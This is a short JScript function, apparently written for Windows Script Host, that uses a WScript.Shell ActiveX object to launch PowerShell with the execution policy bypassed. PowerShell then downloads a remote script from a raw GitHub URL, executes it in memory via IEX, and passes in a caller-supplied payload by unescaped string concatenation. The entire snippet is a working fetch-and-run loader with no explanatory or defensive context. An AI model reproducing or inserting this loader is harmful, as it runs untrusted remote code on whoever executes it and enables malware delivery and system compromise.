function Exec(payload) {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/exec.ps1'); Exec -Payload '" + payload + "'\"");
}
